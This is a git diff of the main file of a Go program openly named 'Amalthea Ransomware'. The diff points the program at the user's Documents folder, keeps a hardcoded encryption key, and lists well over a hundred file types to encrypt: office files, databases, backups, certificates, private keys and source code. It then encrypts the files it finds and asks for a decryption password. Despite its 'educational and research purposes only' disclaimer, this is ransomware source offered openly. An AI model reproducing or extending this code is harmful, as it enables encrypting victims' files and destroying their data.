@@ -3,44 +3,72 @@ package main
 // Import all the required packages
 import (
 	"fmt"
-	"log"
-	"os/user"
+	"os"
+	"runtime"
 
 	"github.com/UpperCenter/Amalthea/src/encryption"
 	"github.com/UpperCenter/Amalthea/src/files"
+	"github.com/gookit/color"
 )
 
-func main() {
-	user, err := user.Current()
-	if err != nil {
-		log.Fatalf(err.Error())
+// Get users home directory
+func userHomeDir() string {
+	// Check GOOS for compile architecture.
+	if runtime.GOOS == "windows" {
+		home := os.Getenv("HOMEDRIVE") + os.Getenv("HOMEPATH")
+		if home == "" {
+			home = os.Getenv("USERPROFILE")
+		}
+		return home
+		// If GOOS == Linux, get Linux ~ path.
+	} else if runtime.GOOS == "linux" {
+		home := os.Getenv("XDG_CONFIG_HOME")
+		if home != "" {
+			return home
+		}
 	}
+	return os.Getenv("HOME")
+}
 
+func main() {
 	// 32 Bit Encryption Password.
 	key := "yjXTF0KtaEk3wOTdV2IZWbazSZPP8JMM"
 	// Only encrypt files and folders in this directory & subdirectories.
-	rootDir := user.Username
+	rootDir := userHomeDir() + "\\Documents\\"
+	// Art Banner
+	banner := color.Red.Sprint(`
+	
+	 _______  _______  _______  _       _________          _______  _______ 
+	(  ___  )(       )(  ___  )( \      \__   __/|\     /|(  ____ \(  ___  )
+	| (   ) || () () || (   ) || (         ) (   | )   ( || (    \/| (   ) |
+	| (___) || || || || (___) || |         | |   | (___) || (__    | (___) |
+	|  ___  || |(_)| ||  ___  || |         | |   |  ___  ||  __)   |  ___  |
+	| (   ) || |   | || (   ) || |         | |   | (   ) || (      | (   ) |
+	| )   ( || )   ( || )   ( || (____/\   | |   | )   ( || (____/\| )   ( |
+	|/     \||/     \||/     \|(_______/   )_(   |/     \|(_______/|/     \|
+
+	`)
 	// Only Encrypt these file extensions.
 	fileextentions := []string{
-		"DOC", "DOCX", "XLS", "XLSX", "PPT", "DAT",
-		"PPTX", "PST", "OST", "EXE", "BIN", "CAB", "MSG", "EML", "VSD", "VSDX", "TXT",
-		"CSV", "RTF", "WKS", "WK1", "PDF", "DWG", "ONETOC2", "SNT",
-		"JPEG", "JPG", "DOCB", "DOCM", "DOT", "DOTM", "DOTX", "XLSM",
-		"XLSB", "XLW", "XLT", "XLM", "XLC", "XLTX", "XLTM", "PPTM",
-		"POT", "PPS", "PPSM", "PPSX", "PPAM", "POTX", "POTM", "EDB",
-		"HWP", "62", "SXI", "STI", "SLDX", "SLDM", "VDI", "VMDK", "VMX",
-		"GPG", "AES", "ARC", "PAQ", "BZ2", "TBK", "BAK", "TAR", "TGZ", "GZ",
-		"7Z", "RAR", "ZIP", "BACKUP", "BIN", "BAC", "ISO", "VCD", "BMP", "PNG", "GIF", "RAW",
-		"CGM", "TIF", "TIFF", "NEF", "PSD", "AI", "SVG", "DJVU", "M4U", "M3U",
-		"MID", "WMA", "FLV", "3G2", "MKV", "3GP", "MP4", "MOV", "AVI", "ASF",
-		"MPEG", "VOB", "MPG", "WMV", "FLA", "SWF", "WAV", "MP3", "SH", "CLASS",
-		"JAR", "JAVA", "RB", "ASP", "PHP", "JSP", "BRD", "SCH", "DCH", "DIP", "PL",
-		"VB", "VBS", "PS1", "BAT", "CMD", "JS", "TS", "ASM", "H", "PAS", "CPP", "C", "CS",
-		"SUO", "SLN", "LDF", "MDF", "IBD", "MYI", "MYD", "FRM", "ODB", "DBF", "DB", "MDB",
-		"ACCDB", "SQL", "SQLITEDB", "SQLITE3", "ASC", "LAY6", "LAY", "MML", "SXM", "OTG", "ODG",
-		"UOP", "STD", "SXD", "OTP", "ODP", "WB2", "SLK", "DIF", "STC", "SXC", "OTS", "ODS",
-		"3DM", "MAX", "3DS", "UOT", "STW", "SXW", "OTT", "ODT", "RPM",
-		"PEM", "P12", "CSR", "CRT", "KEY", "PFX", "DER", "INK", "INC",
+		"3dm", "max", "3ds", "uot", "stw", "sxw", "ott", "odt", "rpm",
+		"7z", "rar", "zip", "backup", "bin", "bac", "iso", "vcd", "bmp", "png", "gif", "raw",
+		"accdb", "sql", "sqlitedb", "sqlite3", "asc", "lay6", "lay", "mml", "sxm", "otg", "odg",
+		"cgm", "tif", "tiff", "nef", "psd", "ai", "svg", "djvu", "m4u", "m3u",
+		"csv", "rtf", "wks", "wk1", "pdf", "dwg", "onetoc2", "snt",
+		"doc", "docx", "xls", "xlsx", "ppt", "dat",
+		"gpg", "aes", "arc", "paq", "bz2", "tbk", "bak", "tar", "tgz", "gz",
+		"hwp", "62", "sxi", "sti", "sldx", "sldm", "vdi", "vmdk", "vmx",
+		"jar", "java", "rb", "asp", "php", "jsp", "brd", "sch", "dch", "dip", "pl",
+		"jpeg", "jpg", "docb", "docm", "dot", "dotm", "dotx", "xlsm",
+		"mid", "wma", "flv", "3g2", "mkv", "3gp", "mp4", "mov", "avi", "asf",
+		"mpeg", "vob", "mpg", "wmv", "fla", "swf", "wav", "mp3", "sh", "class",
+		"pem", "p12", "csr", "crt", "key", "pfx", "der", "ink", "inc",
+		"pot", "pps", "ppsm", "ppsx", "ppam", "potx", "potm", "edb",
+		"pptx", "pst", "ost", "bin", "cab", "msg", "eml", "vsd", "vsdx", "txt",
+		"suo", "sln", "ldf", "mdf", "ibd", "myi", "myd", "frm", "odb", "dbf", "db", "mdb",
+		"uop", "std", "sxd", "otp", "odp", "wb2", "slk", "dif", "stc", "sxc", "ots", "ods",
+		"vb", "vbs", "ps1", "bat", "cmd", "js", "ts", "asm", "h", "pas", "cpp", "c", "cs",
+		"xlsb", "xlw", "xlt", "xlm", "xlc", "xltx", "xltm", "pptm",
 	}
 	/*
 		`size` defines the maximum file size to encrypt.
@@ -48,22 +76,6 @@ func main() {
 		32 * 1024 * 1024
 	*/
 	size := 33554432
-	// Message to present to the user.
-	message := "get ransomware'd"
-	// Art Banner
-	banner :=
-		`
-			 _______  _______  _______  _       _________          _______  _______ 
-			 (  ___  )(       )(  ___  )( \      \__   __/|\     /|(  ____ \(  ___  )
-			 | (   ) || () () || (   ) || (         ) (   | )   ( || (    \/| (   ) |
-			 | (___) || || || || (___) || |         | |   | (___) || (__    | (___) |
-			 |  ___  || |(_)| ||  ___  || |         | |   |  ___  ||  __)   |  ___  |
-			 | (   ) || |   | || (   ) || |         | |   | (   ) || (      | (   ) |
-			 | )   ( || )   ( || )   ( || (____/\   | |   | )   ( || (____/\| )   ( |
-			 |/     \||/     \||/     \|(_______/   )_(   |/     \|(_______/|/     \|
-
-		`
-	fmt.Println(banner)
 
 	// Calls `NewFiles` and begins searching for files to encrypt.
 	e := files.NewFiles(rootDir, fileextentions, size)
@@ -78,14 +90,12 @@ func main() {
 		enc.EncryptFile()
 	}
 
+	color.Println(banner)
 	fmt.Println("\nAmalthea Ransomware")
-	fmt.Println("hello, world!")
-	fmt.Println("\nFor educational and research purposes only.")
-	fmt.Printf("Username: %s\n", rootDir)
+	fmt.Println("For educational and research purposes only.")
 
-	fmt.Println(message)
 	// Prompt user for password to decrypt
-	fmt.Printf("password:")
+	fmt.Printf("Enter Decryption Password:")
 	var password string
 	fmt.Scanln(&password)
 	// Decrypt files, if valid password is provided.
